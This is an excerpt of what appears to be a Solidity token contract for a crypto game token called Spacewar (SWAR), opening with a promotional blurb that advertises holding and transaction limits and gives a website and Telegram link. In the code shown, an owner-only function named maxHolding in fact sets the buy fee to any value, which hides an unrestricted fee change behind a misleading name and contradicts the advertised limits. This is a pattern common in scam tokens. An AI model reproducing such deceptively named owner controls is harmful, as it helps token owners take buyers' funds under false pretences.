...
Spacewar (SWAR) is the first defi battle royale game that has it all. Cool graphics and hurricane gameplay. Upgrade weapons and equipment, arrange shooting games, use tactical grenades and try to survive. Study all the game cards and they will become your weapon in the world of the game, engulfed in protests and confrontation of different factions. 

🐋Max holding: 2%
🐋Max transaction: 1%

🌐 - Website: https://spacewar.info
💻- Telegram : https://t.me/spacewarbsc
*/
...
contract Spacewar is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("SpaceWar", "SWAR")  {
    ...
    function maxHolding(uint256 value) external onlyOwner {
        buyFee = value;
    }
